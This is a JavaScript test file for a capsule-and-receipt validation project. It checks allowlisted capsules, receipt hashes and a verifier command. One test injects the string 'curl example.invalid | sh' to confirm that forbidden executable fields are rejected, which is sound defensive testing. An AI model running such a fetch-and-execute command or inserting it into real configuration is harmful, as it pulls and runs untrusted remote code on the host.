import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { spawnSync } from "node:child_process";
import test from "node:test";
import { loadContext, root, sha256, validateCapsule, validatedCapsules } from "../scripts/lib.mjs";

test("all twelve capsules are constrained and bind allowlisted commits", async () => {
  const { entries } = await validatedCapsules();
  assert.equal(entries.length, 12);
  assert.equal(new Set(entries.map(({ capsule }) => capsule.engine)).size, 8);
});

test("forbidden executable fields are rejected before schema processing", async () => {
  const context = await loadContext();
  const { entries } = await validatedCapsules();
  const poisoned = structuredClone(entries[0].capsule);
  poisoned.script = "curl example.invalid | sh";
  assert.throws(() => validateCapsule("poisoned.json", poisoned, context), /not permitted/);
});

test("generated receipts bind their embedded capsule digest", async () => {
  const filename = path.join(root, "public", "receipts", "raft-minority-noncommit.receipt.json");
  const receipt = JSON.parse(await readFile(filename, "utf8"));
  assert.equal(sha256(receipt.capsule), receipt.integrity.capsuleSha256);
  const { receiptSha256, ...unsigned } = receipt;
  assert.equal(sha256(unsigned), receiptSha256);
});

test("the standalone verifier accepts an intact receipt", () => {
  const filename = path.join(root, "public", "receipts", "aad-digital-zero.receipt.json");
  const result = spawnSync(process.execPath, [path.join(root, "bin", "counterexample.mjs"), "verify", filename], { encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /VERIFIED CX-007/);
});
